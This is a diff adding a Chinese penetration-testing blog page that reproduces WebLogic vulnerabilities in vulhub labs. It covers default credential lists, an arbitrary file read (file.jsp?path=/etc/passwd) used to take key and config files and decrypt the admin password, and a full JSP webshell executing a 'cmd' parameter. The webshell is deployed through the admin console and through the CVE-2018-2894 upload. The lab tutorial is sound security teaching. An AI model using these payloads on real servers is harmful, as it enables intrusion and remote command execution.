@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.zcwww.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic">
+<meta property="og:url" content="http://www.zcwww.top/2023/08/04/weblogic/index.html">
+<meta property="og:site_name" content="欢迎来到成伟的部落">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/d2e949aa3d0f1aa09c577939762c5c6a.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804142057863.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804151508683.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804152211551.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804152504228.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804154558867.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/07.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804160715746.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804160933116.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804161133198.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804161425202.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804162947966.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804163626649.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804175117704.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804175556886.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804181252095.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804181651542.png">
+<meta property="og:image" content="http://www.zcwww.top/2023/08/04/weblogic/image-20230804181955439.png">
+<meta property="article:published_time" content="2023-08-04T01:46:15.000Z">
+<meta property="article:modified_time" content="2023-08-04T10:51:11.214Z">
+<meta property="article:author" content="Markcheng">
+<meta property="article:tag" content="学习 生活 分享 交流">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.zcwww.top/2023/08/04/weblogic/d2e949aa3d0f1aa09c577939762c5c6a.png">
+
+<link rel="canonical" href="http://www.zcwww.top/2023/08/04/weblogic/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Weblogic | 欢迎来到成伟的部落</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">欢迎来到成伟的部落</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录生活中的点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/zcwww6" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.zcwww.top/2023/08/04/weblogic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="Markcheng">
+      <meta itemprop="description" content="去爱 去工作">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎来到成伟的部落">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Weblogic
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-04 09:46:15 / 修改时间：18:51:11" itemprop="dateCreated datePublished" datetime="2023-08-04T09:46:15+08:00">2023-08-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="/2023/08/04/weblogic/d2e949aa3d0f1aa09c577939762c5c6a.png"></p>
+<span id="more"></span>
+
+<h1 id="一、Weblogic介绍"><a href="#一、Weblogic介绍" class="headerlink" title="一、Weblogic介绍"></a>一、Weblogic介绍</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>通俗的讲weblogic是一种web容器，如果你知道apache，tomcat，iis你就应该知道，就是把我们开发的java应用程序运行起来，并提供服务的一种程序。</p>
+<p>官方文档地址：<a target="_blank" rel="noopener" href="http://docs.oracle.com/en/middleware/index.html">http://docs.oracle.com/en/middleware/index.html</a></p>
+<h2 id="2、特性"><a href="#2、特性" class="headerlink" title="2、特性"></a>2、特性</h2><p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
+<p>端口：7001</p>
+<p><strong>标准</strong><br>对业内多种标准的全面支持，包括EJB、JSP、Servlet、JMS、JDBC、XML（标准通用标记语言的子集）和WML，使Web应用系统的实施更为简单，并且保护了投资，同时也使基于标准的解决方案的开发更加简便。<br><strong>可扩展性</strong><br>WebLogic Server以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源pooling以及动态网页和EJB组件群集。<br><strong>快速开发</strong><br>凭借对EJB和JSP的支持，以及WebLogic Server 的Servlet组件架 构体系，可加速投放市场速度。这些开放性标准与WebGain Studio配合时，可简化开发，并可发挥已有的技能，迅速部署应用系统。</p>
+<p>weblogic</p>
+<p>weblogic123</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务启动地址：</span><br><span class="line"><span class="regexp">/opt/</span>weblogic<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/user_projects/</span>domains/hnDoMain</span><br><span class="line"></span><br><span class="line">cd <span class="regexp">/opt/</span>weblogic<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/user_projects/</span>domains/hnDoMain – 进入创建的域目录bin下</span><br><span class="line"></span><br><span class="line">./startWebLogic.sh – 启动weblogic nohup</span><br><span class="line">./startWebLogic.sh &amp; – 后台启动使用</span><br><span class="line">./stopWeblogic.sh – 关闭weblogic</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>典型界面：</p>
+<p><img src="/2023/08/04/weblogic/image-20230804142057863.png"></p>
+<h1 id="二、Weblogic漏洞复现"><a href="#二、Weblogic漏洞复现" class="headerlink" title="二、Weblogic漏洞复现"></a>二、Weblogic漏洞复现</h1><h3 id="1、弱口令"><a href="#1、弱口令" class="headerlink" title="1、弱口令"></a>1、弱口令</h3><p>这里使用vulhub的环境</p>
+<p>(<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/weak_password/">https://vulhub.org/#/environments/weblogic/weak_password/</a>)</p>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#启动漏洞环境</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>启动环境后访问<code>http://ip:7001/console</code>，进入后台</p>
+<p>弱口令直接登录</p>
+<p>账号：weblogic</p>
+<p>密码：Oracle@123</p>
+<p>weblogic常用弱口令：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  Oracle - WebLogic</span><br><span class="line"><span class="keyword">Method</span>	HTTP</span><br><span class="line"><span class="keyword">User</span> ID	<span class="keyword">system</span></span><br><span class="line"><span class="keyword">Password</span>	<span class="keyword">password</span></span><br><span class="line"><span class="keyword">Level</span>	Administrator</span><br><span class="line">Doc	</span><br><span class="line">Notes	<span class="keyword">Login</span> located at /console</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  Oracle - WebLogic</span><br><span class="line"><span class="keyword">Method</span>	HTTP</span><br><span class="line"><span class="keyword">User</span> ID	weblogic</span><br><span class="line"><span class="keyword">Password</span>	weblogic</span><br><span class="line"><span class="keyword">Level</span>	Administrator</span><br><span class="line">Doc	</span><br><span class="line">Notes	<span class="keyword">Login</span> located at /console</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>  Oracle - WebLogic</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">9.0</span> Beta (Diablo)</span><br><span class="line"><span class="keyword">User</span> ID	weblogic</span><br><span class="line"><span class="keyword">Password</span>	weblogic</span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	<span class="keyword">admin</span></span><br><span class="line"><span class="keyword">Password</span>	<span class="keyword">security</span></span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	joe</span><br><span class="line"><span class="keyword">Password</span>	<span class="keyword">password</span></span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	mary</span><br><span class="line"><span class="keyword">Password</span>	<span class="keyword">password</span></span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	<span class="keyword">system</span></span><br><span class="line"><span class="keyword">Password</span>	<span class="keyword">security</span></span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	wlcsystem</span><br><span class="line"><span class="keyword">Password</span>	wlcsystem</span><br><span class="line">Doc	</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>  Oracle - WebLogic Process Integrator</span><br><span class="line"><span class="keyword">Version</span>	<span class="number">2.0</span></span><br><span class="line"><span class="keyword">User</span> ID	wlpisystem</span><br><span class="line"><span class="keyword">Password</span>	wlpisystem</span><br><span class="line">Doc	</span><br></pre></td></tr></table></figure>
+
+<p>如果弱口令不能登录，可以利用以下的任意文件读取获取到秘钥信息从而破译密码</p>
+<h3 id="2、任意文件读取"><a href="#2、任意文件读取" class="headerlink" title="2、任意文件读取"></a>2、任意文件读取</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic密码使用AES（老版本<span class="number">3</span>DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为.<span class="regexp">/security/</span>SerializedSystemIni.dat和.<span class="regexp">/config/</span>config.xml（基于当前目录<span class="regexp">/root/</span>Oracle<span class="regexp">/Middleware/u</span>ser_projects<span class="regexp">/domains/</span>base_domain）</span><br></pre></td></tr></table></figure>
+
+<p>这套环境模拟了一个任意文件下载漏洞</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//y</span>our-ip:<span class="number">7001</span><span class="regexp">/hello/</span>file.jsp?path=<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p>此处抓包，可以发现直接返回了/etc/passwd下的数据</p>
+<p><img src="/2023/08/04/weblogic/image-20230804151508683.png"></p>
+<p>将”/etc/passwd”改为./security/SerializedSystemIni.dat</p>
+<p>抓取秘钥SerializedSystemIni.dat的返回包，复制可能为文本可能会受到一些不可见字符影响，在bp中copy to file ，保存为.dat文件</p>
+<p><img src="/2023/08/04/weblogic/image-20230804152211551.png"></p>
+<p>然后读取密文<code>./config/config.xml</code>找到<code>&lt;node-manager-password-encrypted&gt;</code>的值，即为加密后的管理员密码</p>
+<p><img src="/2023/08/04/weblogic/image-20230804152504228.png"></p>
+<p>然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：<a target="_blank" rel="noopener" href="http://cb.drops.wiki/drops/tips-349.html">http://cb.drops.wiki/drops/tips-349.html</a> ，自己编译一个解密的工具）：</p>
+<p>使用方法：</p>
+<p><img src="/2023/08/04/weblogic/image-20230804154558867.png"></p>
+<p><img src="/2023/08/04/weblogic/07.png"></p>
+<h3 id="3、后台部署webshell"><a href="#3、后台部署webshell" class="headerlink" title="3、后台部署webshell"></a>3、后台部署webshell</h3><ul>
+<li><p>首先准备好test.jsp,内容如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Sentiment&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>将test.jsp打包war文件</p>
+</li>
+</ul>
+<p><img src="/2023/08/04/weblogic/image-20230804160715746.png"></p>
+<ul>
+<li>登录weblogic后台，选择部署—安装</li>
+</ul>
+<p><img src="/2023/08/04/weblogic/image-20230804160933116.png"></p>
+<ul>
+<li>设置路径并上载上面生成的war文件</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/root/</span>Oracle<span class="regexp">/Middleware/u</span>ser_projects<span class="regexp">/domains/</span>base_domain<span class="regexp">/servers/</span>AdminServer/upload</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/04/weblogic/image-20230804161133198.png"></p>
+<p><img src="/2023/08/04/weblogic/image-20230804161425202.png"></p>
+<ul>
+<li>点击下一步设置访问shell文件的根目录路径（test）</li>
+</ul>
+<p><img src="/2023/08/04/weblogic/image-20230804162947966.png"></p>
+<p>设置好后点击完成</p>
+<p>直接shell文件执行命令即可</p>
+<p>成功获取webshell（id处）</p>
+<p><img src="/2023/08/04/weblogic/image-20230804163626649.png"></p>
+<h3 id="4、任意文件上传-CVE-2018-2894"><a href="#4、任意文件上传-CVE-2018-2894" class="headerlink" title="4、任意文件上传(CVE-2018-2894)"></a>4、任意文件上传(CVE-2018-2894)</h3><blockquote>
+<p>Oracle 修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p>
+</blockquote>
+<p><strong>环境准备</strong></p>
+<p>(<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a>)</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure>
+
+<p>启动环境后访问<code>http://ip:7001/console</code>，进入后台</p>
+<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code></p>
+<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项</p>
+<p><img src="/2023/08/04/weblogic/image-20230804175117704.png"></p>
+<p><strong>漏洞复现</strong></p>
+<p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
+<p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code> </p>
+<p>点击提交</p>
+<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<p><img src="/2023/08/04/weblogic/image-20230804175556886.png"></p>
+<p>然后点击安全 -&gt; 添加，然后上传webshell：</p>
+<p>注：这里的webshell是shell.jsp,内容如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;Sentiment&quot;</span>.equals(request.get<span class="constructor">Parameter(<span class="string">&quot;pwd&quot;</span>)</span>))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span>).get<span class="constructor">InputStream()</span>;</span><br><span class="line">        <span class="built_in">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        byte<span class="literal">[]</span> b = <span class="keyword">new</span> byte<span class="literal">[<span class="number">2048</span>]</span>;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="constructor">String(<span class="params">b</span>)</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/04/weblogic/image-20230804181252095.png"></p>
+<p>上传后，查看返回的数据包，其中有时间戳：</p>
+<p><img src="/2023/08/04/weblogic/image-20230804181651542.png"></p>
+<p>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>?/pwd=Sentiment&amp;cmd=[命令]，即可执行webshell：</p>
+<p><img src="/2023/08/04/weblogic/image-20230804181955439.png"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="prev" title="应急响应">
+      <i class="fa fa-chevron-left"></i> 应急响应
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
